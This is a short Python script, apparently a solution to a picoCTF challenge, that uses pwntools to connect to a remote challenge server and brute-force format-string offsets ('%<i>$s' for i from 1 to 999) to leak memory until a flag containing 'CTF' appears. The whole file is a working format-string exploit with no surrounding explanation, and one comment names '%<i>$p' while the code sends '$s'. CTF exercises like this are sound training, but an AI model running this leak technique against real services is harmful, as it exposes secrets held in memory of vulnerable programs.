from pwn import *

bin_path = './vuln'
context.binary = bin_path

for i in range(1, 1000):   # 1 → 999
    # Start the binary fresh each iteration
    p = connect('saturn.picoctf.net',54201)

    # Wait for the program to prompt
    p.recvuntil(b'>> ')

    # Build the payload: %<i>$p
    payload = b'%' + str(i).encode() + b'$s'
    print(payload)
    p.sendline(payload)

    # Read response
    try:
        resp = p.recv(timeout=1)
    except EOFError:
        p.close()
        continue

    # Print index and response
    print(i, resp.strip())

    # Check if it leaked the flag
    if b'CTF' in resp:
        print(f"[+] Found potential flag at offset {i}")
        p.close()
        break

    p.close()
